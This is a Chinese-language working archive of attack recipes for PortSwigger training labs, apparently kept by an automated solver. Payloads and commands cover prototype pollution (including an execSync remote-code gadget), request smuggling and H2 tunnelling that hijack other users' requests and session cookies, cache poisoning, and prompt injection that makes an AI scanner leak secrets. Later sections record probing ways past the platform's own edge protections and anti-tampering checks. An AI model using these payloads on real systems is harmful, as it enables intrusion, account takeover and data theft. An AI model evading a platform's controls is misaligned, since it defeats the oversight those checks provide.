---
title: "PortSwigger 平台实操档案(自 seed 迁出的题面级细节)"
---

# PortSwigger 平台实操档案(自 seed 迁出的题面级细节)

Keywords: portswigger, platform, payloads, channels, lab specifics

按 seed 泛化裁定(2026-10-07)自产品 seed 迁出的平台/题面级细节,归任务层;
seed 只留方法。方法见 [[prototype-pollution-family]]、[[llm-attacks-family]]、
[[request-smuggling-family]]、[[cache-poisoning-family]]。

## 原型污染:客户端载荷速查(迁自 prototype-pollution-family)

```
?__proto__[transport_url]=data:,alert(1)//
?__proto__.sequence=1);alert(1);(
?__pro__proto__to__[transport_url]=data:,alert(1)//
?__proto__[value]=data:,alert(1)//
#__proto__[hitCallback]=alert(document.cookie)
```

约束:`//` 吞尾;jQuery BBQ split("=") 使值内不能含 =。

## 原型污染:服务端八条(迁自 prototype-pollution-family)

1. Node/Express 靶场用 JSON 体;表单编码 500(Unexpected "csrf=")
2. 无反射判读三 gadget:status / json spaces(污染后 JSON 缩进)/ charset
3. 键名过滤只拦字面时 constructor.prototype 等价;提权 gadget 常见 isAdmin
4. 判真污染:{"__proto__":{"json spaces":10}} 后任何 JSON 响应多行缩进
5. 清污染:banner 的 Restart node application -> GET /node-app/restart(重启后 session 失效需重登);触发端点干净状态就可能 500,先跑基线
6. 触发请求照抄表单:空体 500;/admin 表单带 csrf+sessionId+两个 tasks,以 JSON 提交;先读提交 JS 再判端点死活
7. RCE gadget = execArgv:["--eval=require('child_process').execSync('...')"] -> fork 拼进子进程命令行;被劫持任务报 code 1 但其他任务仍 success
8. REST 参数污染路径 /api/internal/<ver>/users/<username>/field/email,# 截断;收紧版本默认(v2 只放行 email),.. 穿到 v1 才是宽面;报错文案可当字段探针;.. 计数当层数尺;forgot-password reset token 每次轮换;表单键位全测用 form_sweep

## LLM 题通道(迁自 seed 旧 llm-lab-channels 笔记)

- AI 扫描器:`POST /api/audit/start` body {"postId":"N"} -> {"status":"started"};进度 WebSocket wss://<host>/api/audit/stream(audit-button.js 驱动);#view-scan-results-link 不渲染;唯一输出通道 = 扫描器自发评论(带任意 name/website,可回读);注入目标是让它在评论/评论 website URL 里带出秘密
- LLM 输出处理:/openai/logs 给全部回合+tool_calls+tool 返回(判载荷是否逐字进上下文);投递面经 product_info 工具结果逐字带回;注册要邮件确认(/register?temp-registration-token=<32>,邮箱须 @exploit-<id>.exploit-server.net 或子域);评论表单带 base64 图片 captcha(取 data-URI 落 PNG 人读);POST /product/reviews/create 成功 302 /product?productId=N,失败 &invalid-captcha=true;模型常概括/审查不复读 -> 需"逐字复读"载体设计

## 走私:绕前端路径封锁的已证形(迁自 request-smuggling-family)

- CL.TE 两步(字节串里的 \r\n 由 conn_reuse 展开成 CRLF,按原样可复放):

```
conn_reuse "<lab>/" --cl-te 'GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1' --quiet
conn_reuse "<lab>/" --send-str 'GET / HTTP/1.1\r\nHost: <lab>\r\n\r\n'   -> 302 Location: /admin(交接响应)
```

- TE.CL 同形换 `--te-cl`(第一步走私帧,第二步普通请求相同)。
- 响应归位:交接响应是 302;Delete 链接在走私直达的 200 管理面板里(面板
  Cache-Control: no-cache)。
- 双 Host 反例:Host 必须已在走私前缀里,靠 body 欠字节等下一请求;下一
  请求再带 Host 会 400(Duplicate header names)。
- 判定横幅:平台比走私请求慢一拍,验证等一拍再读。

## 缓存投毒:反射面细节(迁自 cache-poisoning-family)

- unkeyed 组的反射面通常是 `<link rel="canonical" href='//host/?<query>'/>`(单引号属性 -> `'/><script>alert(1)</script>` 即可破)

关联: [[prototype-pollution-family]]、[[llm-attacks-family]]、[[request-smuggling-family]]、[[cache-poisoning-family]]

## 走私:迁自 request-smuggling-family 的题面级段落(2026-10-07 二轮)

## 五题落地(lab_id / 手法)

| 题 | 手法 |
| --- | --- |
| basic CL.TE | `--cl-te 'G'` 然后 `POST /` -> GPOST |
| basic TE.CL | `--te-cl '<完整 GPOST 请求>'` 单帧 |
| confirming CL.TE | `--cl-te 'GET /404 HTTP/1.1\r\nX-Ignore: X'` |
| obfuscating TE | **顺序: `Transfer-Encoding: x` 在前、`chunked` 在后**(批 27 实测;反顺序 hold 但不翻) -> `--cl-te 'G'` 后 `POST /` -> GPOST |
| confirming TE.CL | `--te-cl '<CL:15 的 GET /404>'` + `GET /` |
| exploiting 绕前端访问控制 | 走私一条指向受保护路径的请求,普通请求收交接响应(形见下) |
## exploiting 组:响应投毒投递 XSS(交付给下一个用户)

- 面:先找"按请求头反射"的页(`GET /post?postId=1` 把 `User-Agent` 原样写进 hidden input 的 value)。
- 手法(CL.TE):走私一份**不完整**前缀,里面已带恶意 UA:
  `conn_reuse <url> --cl-te 'GET /post?postId=1 HTTP/1.1\r\nHost: <lab>\r\nUser-Agent: x"><script>alert(1)</script>\r\nX-Ignore: X'`
  (末尾**不要** CRLF) -> 后端等字节,下一个请求拼上补全,该请求者收到我们的 XSS 响应。
- **反例**:走私**完整**请求(带尾 `\r\n\r\n`)不投毒--响应立刻生成、被前端丢弃/自用;
  两轮实测均无效。要在"下一请求到达时才生成响应"。
- 收口是自动的:lab 的 victim 下一请求落上即 solved(可在其后一次走私的回包 banner 里看到 is-solved)。
## browser 组:CL.0 与客户端失步

- **CL.0(纯 h1)**:前端/后端共用 back-end 连接时,发一条**完整**走私请求当 `POST` 的 body,
  在静态图片路径上成立(`/image/blog/posts/16.jpg` -> `405` + 后端把 body 当新请求执行)。
  响应按 FIFO 落到"下一条客户端请求"上 -> 收口形态是"两条 literal 放一条 conn_reuse":
  第一条 = `POST <静态路径>` + `CL=len(走私请求)` + `GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\n\r\n`,
  第二条 = 任意 `GET /?cb=N`(把队列里的响应取出来)。
- 探测:同一连接两条 literal,看第二条的 status/body 是否被"顶替"(命中静态路径时会出现 `404 "Not Found: /404probe"`)。
- **CSD(浏览器侧)**:向量是 `POST /`(302 /en)不读 body;gadget = 公开可写的评论;
  前缀里写**攻击者自己**的 `Cookie` 让 csrf 过,受害者的 `Cookie` 头反而落进 follow-up 字节成为评论正文。
  详见 [[client-side-desync-family]] 与 [[lab-client-side-desync]]。
## 暂停式 CL.0(服务端失步)

- 面:前端**逐字节转发**(不缓冲)+ 后端在**服务器级重定向**后读超时却仍保留连接
  (Apache ≤ 2.4.52 的已知行为;lab 响应头里直接写着 `Server: Apache/2.4.52`)。
- 步骤:发 `POST <会自 302 的路径>` + `Content-Length: N` 但**不发 body** -> 停住等后端超时响应 -> 再发 N 字节(走私请求)
  -> 后端把它们当成新请求 -> 等价 CL.0 投毒。命中面是 **Apache 目录重定向**(lab: `/resources` -> 302 `/resources/`)。
- **节奏是关键**:后端超时是**速率相关**的(实测 47/61/71/77s),所以"暂停"要写成"**读到数据就发**":
  `conn_reuse --path /resources --cl0-head '<走私请求>' --send-str '<同一走私请求>' --sequential --read-ms 75000`
  (第一次读就是暂停;固定 `--gap-ms` 反而容易踩早/踩晚)。
- 工具:`conn_reuse` v1.2.0 新增 `--cl0`(完整帧)与 **`--cl0-head`(只发头、CL 按"随后要发的 body"算)**;
  另有 `pause_desync`(自动 primer/等待/发送,可在同一连接上链式多条,支持 `{csrf}`/`{session}` 占位符)。
- 本 lab 收口两步:①`GET /admin/ HTTP/1.1\r\nHost: localhost` -> 200 面板 + `Set-Cookie: session=<S>` + `csrf=<T>`;
  ②`POST /admin/delete/`(**尾斜杠**:`/admin/delete` 会被 mod_dir 302 到 `/admin/delete/`)带 `Cookie: session=<S>`
  与 `csrf=<T>&username=carlos` -> 删 carlos。走私请求必须带 `Host: localhost`(前端对 `/admin` 直接 403)。
## exploiting 组:捕获用户请求 / 揭示前端改写

三件事同构:**走私一条"未完成"的请求 -> 下一个落在同一后端连接上的请求的字节被吞进它的 body/headers**。
用 `conn_reuse --cl-te`(前端 CL、后端 TE),走私请求沿用完整头 + 半截 body(或半截头块)。

- **捕获下一个用户的请求**(通用形):目标面 = 公开存储型载体(评论/帖子)。
  走私 `POST /post/comment`(**带攻击者自己的 session+csrf**),`comment=` 结尾,`CL = body.len()+deficit`;
  受害者的请求字节(含 `Cookie: session=<victim>`)落进 `comment` -> 存成评论 -> 读页取 session。
  - **触发**:lab 的 victim 只在"你发若干 POST"后才动一次;`race_send --method POST --form x=y --n 4` 做触发,`nap ~7` 后读。
  - **deficit 调参**:必须 ≤ victim 请求头块长度(Chrome victim 实测 ~815B)。750 截到 `secret=`,815 才含完整 `session=`;过大 -> 后端苦等 -> 前端 `500 Communication timed out`。
- **揭示前端追加头**(通用形):目标面 = 请求回显位(搜索结果页)。
  走私未完成的 `POST /`(body=`search=`),前端随后转发的下一请求(含前端追加头)落进 `search` -> `<h1>...for 'GET / HTTP/1.1\r\nX-<rand>-Ip: <ip>\r\nHost...'</h1>`。
  - 头**加在请求行之后、Host 之前** -> deficit ~40 即可见头名。收口:把该头以 `127.0.0.1` 塞进走私的 `GET /admin`
    (前端直连自带同名头会 `400 Duplicate header names are not allowed`,只能走私);`/admin/delete?username=carlos` -> 302。
- **新件 `smuggle_seq`**:三连接模型(conn A arm / conn B follow / conn C flush),自动 sweep `--deficits 40,80,...`,回每轮 target status + 反映片段;补全必须走**独立连接**(同连接前端 `Connection: close`)。
- **前提**:这三题的前端**跨客户端连接复用后端连接**;`race_send` 的触发请求走别的后端连接(回 200),不污染 pending。
- **未收口面(缓存系)**:[[lab-perform-web-cache-deception]](缓存键=静态 URL,难保 victim 的静态子资源成为 pending 补全者)、
  [[lab-perform-web-cache-poisoning]](缺"产生 302 到 exploit server"的走私请求面;该前端**不跨连接复用**,两连接补全失效)。
## 实录溯源

- [[lab-deliver-reflected-xss]](exploiting 组:响应投毒投递 XSS)
- [[lab-basic-cl-te]]、[[lab-basic-te-cl]]、[[lab-confirming-cl-te-via-differential-responses]]、[[lab-confirming-te-cl-via-differential-responses]]、[[lab-obfuscating-te-header]](五题全收口)
- [[lab-bypass-front-end-controls-cl-te]]、[[lab-bypass-front-end-controls-te-cl]](exploiting 组:绕前端访问控制 + 删 carlos)
- [[lab-capture-other-users-requests]](exploiting 组:捕获下一个用户的请求) 批 34
- [[lab-reveal-front-end-request-rewriting]](exploiting 组:揭示前端追加头 + 删 carlos) 批 34
- [[lab-perform-web-cache-deception]]、[[lab-perform-web-cache-poisoning]](exploiting 组:缓存系,批 34 **未收口**)

## 原型污染:客户端 source/gadget 题面清单(迁自 prototype-pollution-family)

## 客户端 source -> gadget

**source(PP 源)** - 前端把 URL/hash 解析成对象时写 `Object.prototype`:

- `deparam`(jQuery 变体):`key.split('][')`,键形如 `__proto__[x]`
- `$.parseParams`:支持点号键 `__proto__.x`(逐层落原型)
- jQuery BBQ `$.deparam`(hash):`$.bbq.getState('cat')` 解析 `location.hash`
- 净化式防御(`deparamSanitised.js`):`key.replaceAll('__proto__','')` 可被
  `__pro__proto__to__` 塌缩绕回(删子串 -> 重组)

**gadget(汇点)**:

- `transport_url` -> `script.src`(同构题)
- `manager.sequence` -> `eval('...manager.macro('+seq+')')`(注意 `seq` 被 `+1`
  隐式拼接,载荷须让表达式语法完整)
- `hitCallback` -> GA `setTimeout(callback,10)` 字符串求值
- browser API descriptor:`Object.defineProperty(o,'p',{...})` 的 descriptor 继承
  `Object.prototype.value`,绕自有只读属性补丁 -> `?__proto__[value]=<payload>`;
  凡接受 options/descriptor 对象的 browser API 都读原型链未定义属性

## cache-and-smuggling 实测细节(迁整篇原笔记)

---
title: cache-and-smuggling-live-mechanisms
---

# cache-and-smuggling-live-mechanisms

这几条是 PortSwigger "缓存投毒 / 请求走私 / host-header" 三家族里最容易误判的机制,批40 逐条实测过。遇到同族题先按这些先验定位,能省掉大量猜测。

## 缓存判定:是 `Cache-Control: max-age`,不是"路径看起来像静态"

- `/resources/js/foo.js` 404(app 仍给 `Cache-Control: max-age=30`)-> 第二次 `X-Cache: hit` ✓
- `/nonexistent.txt` 404(无 cache 头)-> **不缓存**(连 X-Cache 都没有)✓
- `/post?postId=1` 200(无 cache 头)-> 不缓存 ✓
- ⇒ "the front-end caches static resources" 这句话的真实含义往往是:**app 对静态前缀(如 `/resources/js/*`)一律加 max-age**,
  于是一切落在该前缀下的响应(含 404)都可缓存。判"缓存规则"要用带/不带 max-age 的对照请求,而不是猜 URL 模式。

## Host 路由:前端(或后端的 vhost 层)按 Host 选站,于是 `Host: <exploit-server>` 能直达 exploit server

- 判据:同一路径用 `Host: <exploit>` 请求得到 exploit server 的 `"Resource not found - Academy Exploit Server"`,
  而靶场 app 的 404 是 JSON `"Not Found"` -- 用这个可区分"响应来自谁"。
- **被走私的请求不会再被路由一次**:它已经在"前端 ↔ 靶场后端"的连接里,只能由靶场 app 处理。
  验证手段:exploit server 的访问日志(只有自己的请求 = 走私没到)。
- **缓存键通常含 Host**:用别的 Host 拿到的响应不会命中靶场 Host 的同一个 URL。

## exploit server(Go to exploit server)的 STORE 表单

- 必填三个字段:`responseFile` / `responseHead` / `responseBody`(+`formAction=STORE`);`formAction=ACCESS_LOG` 可读访问日志(同样要带三个字段)。
- **`responseHead` 只吃两行**(状态行 + 一个头)。加第三行(例如 `Cache-Control: max-age=300`)**会把该文件清掉**,之后请求返回 404。
  ⇒ 想让 exploit server 的响应"可缓存",靠 Head 是做不到的;它的响应默认没有 Cache-Control。
- 可以存任意状态行:`HTTP/1.1 302 Found\nLocation: https://<exploit>/js/evil.js` 会真的回 302(JS 路径上尤其有用:
  把 `/resources/js/tracking.js` 存成 302 -> redirect 到 `/js/evil.js` = `alert(document.cookie)`,响应类型 `application/javascript`)。

## cache key injection:除 Origin 外的头都不进键,`utm_content` 被键剥离

- 键形如 `<request-target>$$Origin=<Origin 头>`;`Pragma: x-get-cache-key` 直接把键回显在响应头里(解这道题必须用它)。
- **`utm_content=<v>` 是唯一被键剥离的参数,且与位置无关**:`?a=1&b=2` ≡ `?a=1&b=2&utm_content=Z` ≡ `?a=1&utm_content=Z&b=2`;
  `?a=1&utm_content=Z&b=2` 的键是 `?a=1&b=2`(只删那一对,不删其后所有参数)。
  ⇒ 这是"让后端看到更多参数、而缓存键保持受害者那份"的唯一注入口。
- 在 URL 里书写 `$$Origin=X` **不会**与带 `Origin: X` 头的请求同键(键尾会多一个 `$$`)--不要相信"$$ 碰撞"这类口口相传。

## 工具操作的坑

- 用 ureq 类件(`cache_probe`/`http_session`/`http_dump`)显式指定与 URL 同 host 的 `Host:` 头时,会形成重复 Host ⇒ 前端 421/403;
  要字节级控制(重复头、绝对型请求行、裸 LF 等)必须用 `conn_reuse --send-str` / `raw_http`。
- `conn_reuse --cl-te '<prefix>'` 语义:`POST <--path>` + `Content-Length: len("0\r\n\r\n"+prefix)` + `Transfer-Encoding: chunked`,
  body = `0\r\n\r\n<prefix>`(prefix 里写 `\r\n` 字面转义)。外层请求若是 app 不消费 body 的路径(如 `POST /`),app 会回 `Connection: close`。
- 平台会限流:短时间连发多帧走私请求会出现 `Connection reset by peer` / `Resource temporarily unavailable`,隔一会儿重试即可。[[request-smuggling-family]] [[cache-poisoning-family]]

## h2 隧道与 H2.CL 实测细节(迁整篇原笔记)

---
title: h2-tunnelling-and-h2cl-practice
---

# h2-tunnelling-and-h2cl-practice

PortSwigger 的 HTTP/2 高级走私三题(0.CL / H2.CL / request tunnelling)共用一套 h2 原语与观察手法。下面是批 41 实测可用的做法,遇到同族题直接套。

## 1. 注入原语:header NAME 里的 CRLF(而不是 :path)

- `h2_req <url> --hdr2 'NAME||VALUE'` 会把 `NAME` 与 `VALUE` 原样放进 HPACK 头块;两个字段里的 CRLF 都会被前端**透传**。
- 最实用的是把整条后续 h1 请求塞进 **NAME**:
  `--hdr2 'a: b\r\n\r\nGET /admin HTTP/1.1\r\nHost: <inst>\r\n<extra headers>\r\n\r\nAA||zz'`
  ⇒ 前端把 `a: b` 当头,遇到值里的空行就"结束头部",随后 `GET /admin ...` 成为**后端连接上的下一条请求**。
  首行必须是合法头(`NAME: VALUE`),否则后端回 `400 {"error":"Invalid request"}`;注入的请求**会真的执行**
  (判据:让它写一条评论,再看评论列表)。
- `:path` 里塞 CRLF 同样透传(0.CL 那题用它执行任意 h1 请求),但 h2 的 `content-length` 头在 0.CL 那题会被前端
  丢弃/重算(⇒ 该题 H2.CL 不成立),所以**同名头在不同 lab 的行为要分别实测**。

## 2. 读出嵌套响应:HEAD 外层 + 同路径 tunnelled 请求(最好用)

```
h2_req <url> --method HEAD --path /admin \
  --hdr2 'a: b\r\n\r\nGET /admin HTTP/1.1\r\nHost: <inst>\r\n<forged>\r\n\r\nAA||zz'
```
- 外层方法用 **HEAD** 时,前端对这条流的"预期响应长度"= 该路径自身响应长度 ⇒ 后端那条**隧道请求的响应字节**
  会被当成外层响应的 body 交回来,h2 body 里直接出现嵌套响应的**原始 HTTP 文本**(状态行+头+body 前段)。
- 外层换成 `HEAD /`(长度不匹配)时得到
  `500 Server Error: Proxy error ... Received only 3180 of expected 8880 bytes of data`
  -- **数字 = 嵌套响应长度**,可以当成极灵敏的 oracle:门条件一变,数字就变。

## 3. 泄漏前端追加的内部请求头

让隧道请求的 `Content-Length` 大于实际 body(under-fill),后端继续读,把前端**追加**的头字节当成 body 存下来:
```
--hdr2 'a: b\r\n\r\nPOST /post/comment HTTP/1.1\r\nHost: <inst>\r\nCookie: session=<S>\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 150\r\n\r\ncsrf=<T>&postId=1&name=LEAK&email=a@b.c&comment=||zz'
```
随后读评论列表,就能看到 `X-SSL-VERIFIED: 0` / `X-SSL-CLIENT-CN: null` / `X-FRONTEND-KEY: <实例级静态值>` 等。
注意:这些头是**追加在请求末尾**的 ⇒ 如果隧道请求自己用 `\r\n\r\n` 正常收尾,追加头就不落在该请求里,
于是"后端看到的只有攻击者给的头"--这正是伪造身份的前提。

## 4. H2.CL 与多流驱动

- H2.CL 帧:`POST /` + `content-length: 0` + body = 走私的 h1 请求(前端用 DATA 长度、后端用我们给的 CL:0,
  于是 body 成为新请求)。
- 用 `h2_burst` 做多流并排:`--req 'POST /|<smuggled h1>|content-length: 0;;content-type: application/x-www-form-urlencoded'`
  再 `--req 'GET <想被投毒的 URL>'`,一条 TCP 上两个流一次写出(burst_bytes ≤1400 说明单包)。
- **判别要点**:走私请求一定要产生**与自然响应不同**的响应(404/302),否则"错位是否发生"无法判断
  -- 批 41 就是走私同一 JS 路径导致两边都是 230B 的 JS,白白浪费一轮。

## 5. Twig/模板侧的坑(顺带)

- **非严格模式**下,`{{obj.noSuchAttr}}` 静默渲染为**空**,不报错 ⇒ 不能用报错来枚举方法/属性。
  能报错的只有:编译期(`Unknown "dump" function`)、以及方法内部抛出的异常(栈迹会给出文件名+行号)。
- Twig 2.4.6 里 `_self.getEnvironment()` 走属性解析**取不到**(渲染为空)⇒ `registerUndefinedFilterCallback`
  这类 Twig 层 RCE 被堵;要看栈迹确认渲染是否外包给独立 PHP CLI 进程(`Command line code`)。[[h2-smuggling-family]] [[ssti-family]]

## Host 头族平台边缘墙实测口径(迁自 host-header-family)

## 平台现代边缘墙(PortSwigger 学院实测口径)

- 毒 Host(裸改写为外部域)在现代边缘全通道封:正常域 h1/h2 皆直接击杀,
  `.h1-` 形域 421/403;`X-Forwarded-Host`/`X-Forwarded-For`/子域/大小写变体全灭。
- 浏览器臂不可改 `:authority` 伪头与 Host(均在改写面外),CDP 原生指纹无解。
- 连接态松弛(首请求合法 Host 后连接放行毒 Host)成立的钥匙是边缘墙的 lab 会话 cookie
  (2026-10-10 实战证伪旧判;TLS 指纹非门槛)。
- 解锁条件(已被实战证伪,2026-10-10):钥匙不是 TLS 指纹——边缘墙要求的 lab 会话 cookie
  带上后,同 TCP 连接先合法 Host 紧接毒 Host 即放行(连接态松弛成立;rs 件栈直射可达)。

## 走私:TE.TE 实测方向(迁自 request-smuggling-family)

重复 TE 头 `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`:前端取**最后**(`x` 不认 -> 用 CL)、后端取**第一**(chunked)-> 退化成 CL.TE。

## Links

- evidences: [[academy-edge-lab-cookie-gate]]
## 平台反作弊实例锁(flawed-parsing 单题级实证,2026-10-10)

- 自供 `_lab` cookie 触发 `400 Too Nosy`(「Tampering with the _lab cookie is not required…」);边缘把 Host 段锁为实例名 allowlist(含 absolute-form 请求行);四旁路(转发头/重复头/h2 伪头/连接态)实测关闭——Host 变体类实验不携带 `_lab` 即可正常回包。

## 0.CL 真原语形(2026-10-11 实战纠偏)

- Expect 型 0.CL 已被否证(前端照常消费声明的体);公开真原语=畸变 `Content-Length : N`(名内空格)× early-response gadget × 0.CL→CL.0 双失步的组合,按帧铸成可直接喷发;落点差分(切片 404 未现)是残余问题,原语本身成立。
